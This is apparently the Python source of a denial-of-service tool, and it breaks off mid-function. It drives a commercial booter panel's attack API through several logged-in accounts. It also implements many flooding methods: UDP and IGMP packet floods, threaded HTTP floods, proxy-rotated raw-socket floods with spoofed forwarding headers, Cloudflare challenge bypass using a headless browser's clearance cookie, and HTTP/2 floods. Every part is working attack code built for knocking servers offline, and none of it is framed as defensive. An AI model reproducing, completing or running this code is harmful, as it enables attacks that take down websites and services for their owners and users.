# -*- coding: utf-8 -*-
from os import system, name
import os, threading, requests, sys, cloudscraper, datetime, time, socket, ssl, random, httpx
from urllib.parse import urlparse
from requests.cookies import RequestsCookieJar
import undetected_chromedriver as webdriver
from sys import stdout
from colorama import Fore, init
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE_URL = 'https://hardstresser.org'
HARDSTRESSER_SESSIONS = []

def login_hardstresser(username, password):
    session = requests.Session()
    session.verify = False  # Sometimes needed for these panels
    url = BASE_URL + '/panel/login.php'
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': BASE_URL,
        'referer': BASE_URL + '/panel/login.php',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36'
    }
    data = {
        'kullaniciadi': username,
        'sifreniz': password
    }
    try:
        response = session.post(url, headers=headers, data=data, timeout=15)
        if "login.php" not in response.url and response.status_code == 200:
            return session
    except:
        pass
    return None

def setup_accounts():
    global HARDSTRESSER_SESSIONS
    clear()
    stdout.write(Fore.LIGHTCYAN_EX + " [*] HardStresser.org API Setup\n")
    
    accounts = []
    from_file = False
    # Try loading from file first
    if os.path.exists("accounts.txt"):
        with open("accounts.txt", "r") as f:
            for line in f:
                if ":" in line:
                    accounts.append(line.strip().split(":", 1))
        if accounts:
            from_file = True
            stdout.write(Fore.GREEN + f" [+] Loaded {len(accounts)} accounts from 'accounts.txt'\n")
    
    # If file is empty or missing, ask interactively
    if not accounts:
        stdout.write(Fore.WHITE + " Enter accounts (user:pass), one per line. (Empty line to finish)\n")
        while True:
            line = input(Fore.LIGHTGREEN_EX + "> " + Fore.WHITE).strip()
            if not line:
                break
            if ":" in line:
                accounts.append(line.split(":", 1))
            else:
                stdout.write(Fore.RED + " [!] Invalid format. Use user:pass\n")

    if not accounts:
        stdout.write(Fore.RED + " [!] No accounts found. API features will be disabled.\n")
        time.sleep(2)
        return

    # Ask to save if entered interactively
    if not from_file:
        stdout.write("\n" + Fore.WHITE + " Do you want to save these accounts to 'accounts.txt' for next time? (y/n): ")
        save_choice = input(Fore.LIGHTGREEN_EX).lower()
        if save_choice == 'y':
            with open("accounts.txt", "w") as f:
                for user, pwd in accounts:
                    f.write(f"{user}:{pwd}\n")
            stdout.write(Fore.GREEN + " [+] Accounts saved to 'accounts.txt'!\n")

    stdout.write("\n" + Fore.CYAN + " Logging in accounts...\n")
    i = 0
    while i < len(accounts):
        user, pwd = accounts[i]
        stdout.write(f" {Fore.MAGENTA}[*]{Fore.WHITE} {user}...")
        sess = login_hardstresser(user, pwd)
        if sess:
            HARDSTRESSER_SESSIONS.append({'user': user, 'session': sess, 'busy': False})
            stdout.write(Fore.GREEN + " Success\n")
            i += 1
        else:
            stdout.write(Fore.RED + " Failed\n")
            stdout.write(Fore.YELLOW + f" [!] Login failed for {user}.\n")
            stdout.write(Fore.WHITE + " Enter correct details (user:pass) to retry, or type 'skip': ")
            retry = input(Fore.LIGHTGREEN_EX + "> " + Fore.WHITE).strip()
            
            if retry.lower() == 'skip':
                i += 1
            elif ":" in retry:
                accounts[i] = retry.split(":", 1)
                # Keep i the same to retry this slot
            else:
                stdout.write(Fore.RED + " [!] Invalid input. Skipping...\n")
                i += 1
        time.sleep(1) # 1 second delay between account operations
    
    stdout.write(f"\n {Fore.LIGHTCYAN_EX}[*]{Fore.WHITE} Total active sessions: {len(HARDSTRESSER_SESSIONS)}\n")
    time.sleep(2)

def launch_api_attack(target, port, duration, method):
    global HARDSTRESSER_SESSIONS
    if not HARDSTRESSER_SESSIONS:
        stdout.write(Fore.RED + " [!] No active sessions! Please login first.\n")
        return
    
    available_accounts = [acc for acc in HARDSTRESSER_SESSIONS if not acc['busy']]
    
    if not available_accounts:
        stdout.write(Fore.RED + " [!] All accounts are currently busy attacking. Please wait.\n")
        return
    
    stdout.write(Fore.MAGENTA + " [*] " + Fore.WHITE + f"Launching API Attack on {target}:{port} for {duration}s using {method}...\n")
    
    for account in available_accounts:
        account['busy'] = True # Mark as busy
        sess = account['session']
        user = account['user']

        url = BASE_URL + '/panel/includes/ajax/user/attacks/hub.php'
        
        params = {
            'type': 'start',
            'host': target,
            'port': port,
            'time': duration,
            'method': method,
            'vip': '0'
        }
        
        headers = {
            'sec-ch-ua-platform': '"Windows"',
            'Referer': BASE_URL + '/panel/booter.php',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Not:A-Brand";v="99", "Brave";v="145", "Chromium";v="145"',
            'sec-ch-ua-mobile': '?0'
        }
        
        def run_api(acc, u, p, d, m, h):
            try:
                resp = acc['session'].get(u, params=p, headers=h, timeout=15)
                if resp.status_code == 200:
                    msg = resp.text.strip().replace('\n', ' ')
                    if "success" in msg.lower() or "started" in msg.lower() or "attacking" in msg.lower():
                        stdout.write(f" {Fore.GREEN}[+]{Fore.WHITE} Account {acc['user']}: Started\n")
                    else:
                        stdout.write(f" {Fore.YELLOW}[!]{Fore.WHITE} Account {acc['user']} Error: {msg[:40]}\n")
                else:
                    stdout.write(f" {Fore.RED}[!]{Fore.WHITE} Account {acc['user']} HTTP {resp.status_code}\n")
            except:
                stdout.write(f" {Fore.RED}[!]{Fore.WHITE} Account {acc['user']}: Connection Error\n")
            
            # Wait for duration before freeing the account
            time.sleep(int(d) + 1) # Added 1s extra delay as requested
            acc['busy'] = False

        threading.Thread(target=run_api, args=(account, url, params, duration, method, headers)).start()
        time.sleep(1) # Delay between starting different accounts to avoid spamming the API

def countdown(t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    while True:
        if (until - datetime.datetime.now()).total_seconds() > 0:
            stdout.flush()
            stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Attack status => " + str((until - datetime.datetime.now()).total_seconds()) + " sec left ")
        else:
            stdout.flush()
            stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Attack Done !                                   \n")
            return

#region get
def get_target(url):
    url = url.rstrip()
    target = {}
    target['uri'] = urlparse(url).path
    if target['uri'] == "":
        target['uri'] = "/"
    target['host'] = urlparse(url).netloc
    target['scheme'] = urlparse(url).scheme
    if ":" in urlparse(url).netloc:
        target['port'] = urlparse(url).netloc.split(":")[1]
    else:
        target['port'] = "443" if urlparse(url).scheme == "https" else "80"
        pass
    return target

def get_proxylist(type):
    if type == "SOCKS5":
        r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=10000&country=all").text
        r += requests.get("https://www.proxy-list.download/api/v1/get?type=socks5").text
        open("./resources/socks5.txt", 'w').write(r)
        r = r.rstrip().split('\r\n')
        return r
    elif type == "HTTP":
        r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=10000&country=all").text
        r += requests.get("https://www.proxy-list.download/api/v1/get?type=http").text
        open("./resources/http.txt", 'w').write(r)
        r = r.rstrip().split('\r\n')
        return r

def get_proxies():
    global proxies
    if not os.path.exists("./proxy.txt"):
        stdout.write(Fore.MAGENTA+" [*]"+Fore.WHITE+" You Need Proxy File ( ./proxy.txt )\n")
        return False
    proxies = open("./proxy.txt", 'r').read().split('\n')
    return True

def get_cookie(url):
    global useragent, cookieJAR, cookie
    options = webdriver.ChromeOptions()
    arguments = [
    '--no-sandbox', '--disable-setuid-sandbox', '--disable-infobars', '--disable-logging', '--disable-login-animations',
    '--disable-notifications', '--disable-gpu', '--headless', '--lang=ko_KR', '--start-maxmized',
    '--user-agent=Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en' 
    ]
    for argument in arguments:
        options.add_argument(argument)
    driver = webdriver.Chrome(options=options)
    driver.implicitly_wait(3)
    driver.get(url)
    for _ in range(60):
        cookies = driver.get_cookies()
        tryy = 0
        for i in cookies:
            if i['name'] == 'cf_clearance':
                cookieJAR = driver.get_cookies()[tryy]
                useragent = driver.execute_script("return navigator.userAgent")
                cookie = f"{cookieJAR['name']}={cookieJAR['value']}"
                driver.quit()
                return True
            else:
                tryy += 1
                pass
        time.sleep(1)
    driver.quit()
    return False

def spoof(target):
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    spoofip = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return (
        "X-Forwarded-Proto: Http\r\n"
        f"X-Forwarded-Host: {target['host']}, 1.1.1.1\r\n"
        f"Via: {spoofip}\r\n"
        f"Client-IP: {spoofip}\r\n"
        f'X-Forwarded-For: {spoofip}\r\n'
        f'Real-IP: {spoofip}\r\n'
    )

##############################################################################################
def get_info_l7():
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"URL      "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
    target = input()
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"PORT     "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
    port = input()
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"TIME(s)  "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
    t = input()
    if int(t) > 60:
        stdout.write(Fore.RED + " [!] Time limited to 60s for stability.\n")
        t = "60"
    return target, port, t

def get_info_l4():
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"IP       "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
    target = input()
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"PORT     "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
    port = input()
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"TIME(s)  "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
    t = input()
    if int(t) > 60:
        stdout.write(Fore.RED + " [!] Time limited to 60s for stability.\n")
        t = "60"
    return target, port, t
##############################################################################################

#region layer4
def runflooder(host, port, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    rand = random._urandom(4096)
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=flooder, args=(host, port, rand, until))
            thd.start()
        except:
            pass

def flooder(host, port, rand, until_datetime):
    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            sock.sendto(rand, (host, int(port)))
        except:
            sock.close()
            pass


def runsender(host, port, th, t, payload):
    if payload == "":
        payload = random._urandom(60000)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    #payload = Payloads[method]
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=sender, args=(host, port, until, payload))
            thd.start()
        except:
            pass

def sender(host, port, until_datetime, payload):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            sock.sendto(payload, (host, int(port)))
        except:
            sock.close()
            pass
            
#endregion

#region METHOD

#region HEAD

def Launch(url, th, t, method): #testing
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            exec("threading.Thread(target=Attack"+method+", args=(url, until)).start()")
        except:
            pass


def LaunchHEAD(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackHEAD, args=(url, until))
            thd.start()
        except:
            pass

def AttackHEAD(url, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            requests.head(url)
            requests.head(url)
        except:
            pass
#endregion

#region POST
def LaunchPOST(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackPOST, args=(url, until))
            thd.start()
        except:
            pass

def AttackPOST(url, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            requests.post(url)
            requests.post(url)
        except:
            pass
#endregion

#region RAW
def LaunchRAW(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackRAW, args=(url, until))
            thd.start()
        except:
            pass

def AttackRAW(url, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            requests.get(url)
            requests.get(url)
        except:
            pass
#endregion

#region PXRAW
def LaunchPXRAW(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackPXRAW, args=(url, until))
            thd.start()
        except:
            pass

def AttackPXRAW(url, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        proxy = 'http://'+str(random.choice(list(proxies)))
        proxy = {
            'http': proxy,   
            'https': proxy,
        }
        try:
            requests.get(url, proxies=proxy)
            requests.get(url, proxies=proxy)
        except:
            pass
#endregion

#region PXSOC
def LaunchPXSOC(url, th, t):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req =  "GET " +target['uri'] + " HTTP/1.1\r\n"
    req += "Host: " + target['host'] + "\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Connection: Keep-Alive\r\n\r\n"
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackPXSOC, args=(target, until, req))
            thd.start()
        except:
            pass

def AttackPXSOC(target, until_datetime, req):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            proxy = random.choice(list(proxies)).split(":")
            if target['scheme'] == 'https':
                s = socks.socksocket()
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
                s.connect((str(target['host']), int(target['port'])))
                s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
            else:
                s = socks.socksocket()
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
                s.connect((str(target['host']), int(target['port'])))
            try:
                for _ in range(100):
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            return
#endregion

#region SOC
def LaunchSOC(url, th, t):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req =  "GET "+target['uri']+" HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Connection: Keep-Alive\r\n\r\n"
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackSOC, args=(target, until, req))
            thd.start()
        except:
            pass

def AttackSOC(target, until_datetime, req):
    if target['scheme'] == 'https':
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['host']), int(target['port'])))
        s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
    else:
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['host']), int(target['port'])))
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            try:
                for _ in range(100):
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            pass
#endregion

def LaunchPPS(url, th, t):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackPPS, args=(target, until))
            thd.start()
        except:
            pass

def AttackPPS(target, until_datetime): #
    if target['scheme'] == 'https':
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['host']), int(target['port'])))
        s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
    else:
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['host']), int(target['port'])))
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            try:
                for _ in range(100):
                    s.send(str.encode("GET / HTTP/1.1\r\n\r\n"))
            except:
                s.close()
        except:
            pass

def LaunchNULL(url, th, t):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req =  "GET "+target['uri']+" HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
    req += "User-Agent: null\r\n"
    req += "Referrer: null\r\n"
    req += spoof(target) + "\r\n"
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackNULL, args=(target, until, req))
            thd.start()
        except:
            pass

def AttackNULL(target, until_datetime, req): #
    if target['scheme'] == 'https':
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['host']), int(target['port'])))
        s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
    else:
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['host']), int(target['port'])))
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            try:
                for _ in range(100):
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            pass

def LaunchSPOOF(url, th, t):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req =  "GET "+target['uri']+" HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += spoof(target)
    req += "Connection: Keep-Alive\r\n\r\n"
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackSPOOF, args=(target, until, req))
            thd.start()
        except:
            pass

def AttackSPOOF(target, until_datetime, req): #
    if target['scheme'] == 'https':
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['host']), int(target['port'])))
        s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
    else:
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['host']), int(target['port'])))
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            try:
                for _ in range(100):
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            pass

def LaunchPXSPOOF(url, th, t, proxy):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req =  "GET "+target['uri']+" HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += spoof(target)
    req += "Connection: Keep-Alive\r\n\r\n"
    for _ in range(int(th)):
        try:
            randomproxy = random.choice(proxy)
            thd = threading.Thread(target=AttackPXSPOOF, args=(target, until, req, randomproxy))
            thd.start()
        except:
            pass

def AttackPXSPOOF(target, until_datetime, req, proxy): #
    proxy = proxy.split(":")
    print(proxy)
    try:
        if target['scheme'] == 'https':
            s = socks.socksocket()
            #s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            s.connect((str(target['host']), int(target['port'])))
            s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
        else:
            s = socks.socksocket()
            #s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            s.connect((str(target['host']), int(target['port'])))
    except:
        return
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            try:
                for _ in range(100):
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            pass

#region CFB
def LaunchCFB(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    scraper = cloudscraper.create_scraper()
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackCFB, args=(url, until, scraper))
            thd.start()
        except:
            pass

def AttackCFB(url, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url, timeout=15)
            scraper.get(url, timeout=15)
        except:
            pass
#endregion

#region PXCFB
def LaunchPXCFB(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    scraper = cloudscraper.create_scraper()
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackPXCFB, args=(url, until, scraper))
            thd.start()
        except:
            pass

def AttackPXCFB(url, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            proxy = {
                    'http': 'http://'+str(random.choice(list(proxies))),   
                    'https': 'http://'+str(random.choice(list(proxies))),
            }
            scraper.get(url, proxies=proxy)
            scraper.get(url, proxies=proxy)
        except:
            pass
#endregion

#region CFPRO
def LaunchCFPRO(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    session = requests.Session()
    scraper = cloudscraper.create_scraper(sess=session)
    jar = RequestsCookieJar()
    jar.set(cookieJAR['name'], cookieJAR['value'])
    scraper.cookies = jar
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackCFPRO, args=(url, until, scraper))
            thd.start()
        except:
            pass

def AttackCFPRO(url, until_datetime, scraper):
    headers = {
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'TE': 'trailers',
    }
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url=url, headers=headers, allow_redirects=False)
            scraper.get(url=url, headers=headers, allow_redirects=False)
        except:
            pass
#endregion

#region CFSOC
def LaunchCFSOC(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    target = get_target(url)
    req =  'GET '+ target['uri'] +' HTTP/1.1\r\n'
    req += 'Host: ' + target['host'] + '\r\n'
    req += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'
    req += 'Accept-Encoding: gzip, deflate, br\r\n'
    req += 'Accept-Language: ko,ko-KR;q=0.9,en-US;q=0.8,en;q=0.7\r\n'
    req += 'Cache-Control: max-age=0\r\n'
    req += 'Cookie: ' + cookie + '\r\n'
    req += f'sec-ch-ua: "Chromium";v="100", "Google Chrome";v="100"\r\n'
    req += 'sec-ch-ua-mobile: ?0\r\n'
    req += 'sec-ch-ua-platform: "Windows"\r\n'
    req += 'sec-fetch-dest: empty\r\n'
    req += 'sec-fetch-mode: cors\r\n'
    req += 'sec-fetch-site: same-origin\r\n'
    req += 'Connection: Keep-Alive\r\n'
    req += 'User-Agent: ' + useragent + '\r\n\r\n\r\n'
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackCFSOC,args=(until, target, req,))
            thd.start()
        except:  
            pass

def AttackCFSOC(until_datetime, target, req):
    if target['scheme'] == 'https':
        packet = socks.socksocket()
        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        packet.connect((str(target['host']), int(target['port'])))
        packet = ssl.create_default_context().wrap_socket(packet, server_hostname=target['host'])
    else:
        packet = socks.socksocket()
        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        packet.connect((str(target['host']), int(target['port'])))
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            for _ in range(10):
                packet.send(str.encode(req))
        except:
            packet.close()
            pass
#endregion

#region testzone
def attackSKY(url, timer, threads):
    for i in range(int(threads)):
        threading.Thread(target=LaunchSKY, args=(url, timer)).start()

def LaunchSKY(url, timer):
    proxy = random.choice(proxies).strip().split(":")
    timelol = time.time() + int(timer)
    req =  "GET / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
    req += "Cache-Control: no-cache\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Sec-Fetch-Site: same-origin\r\n"
    req += "Sec-GPC: 1\r\n"
    req += "Sec-Fetch-Mode: navigate\r\n"
    req += "Sec-Fetch-Dest: document\r\n"
    req += "Upgrade-Insecure-Requests: 1\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    while time.time() < timelol:
        try:
            s = socks.socksocket()
            s.connect((str(urlparse(url).netloc), int(443)))
            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            ctx = ssl.SSLContext()
            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
            s.send(str.encode(req))
            try:
                for _ in range(100):
                    s.send(str.encode(req))
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            s.close()

def attackSTELLAR(url, timer, threads):
    for i in range(int(threads)):
        threading.Thread(target=LaunchSTELLAR, args=(url, timer)).start()

def LaunchSTELLAR(url, timer):
    timelol = time.time() + int(timer)
    req =  "GET / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
    req += "Cache-Control: no-cache\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Sec-Fetch-Site: same-origin\r\n"
    req += "Sec-GPC: 1\r\n"
    req += "Sec-Fetch-Mode: navigate\r\n"
    req += "Sec-Fetch-Dest: document\r\n"
    req += "Upgrade-Insecure-Requests: 1\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    while time.time() < timelol:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((str(urlparse(url).netloc), int(443)))
            ctx = ssl.create_default_context()
            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
            s.send(str.encode(req))
            try:
                for _ in range(100):
                    s.send(str.encode(req))
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            s.close()
#endregion

def LaunchHTTP2(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        threading.Thread(target=AttackHTTP2, args=(url, until)).start()

def AttackHTTP2(url, until_datetime):
    headers = {
            'User-Agent': random.choice(ua),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'TE': 'trailers',
            }
    client = httpx.Client(http2=True)
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            client.get(url, headers=headers)
            client.get(url, headers=headers)
        except:
            pass

def LaunchPXHTTP2(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        threading.Thread(target=AttackHTTP2, args=(url, until)).start()

def AttackPXHTTP2(url, until_datetime):
    headers = {
            'User-Agent': random.choice(ua),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
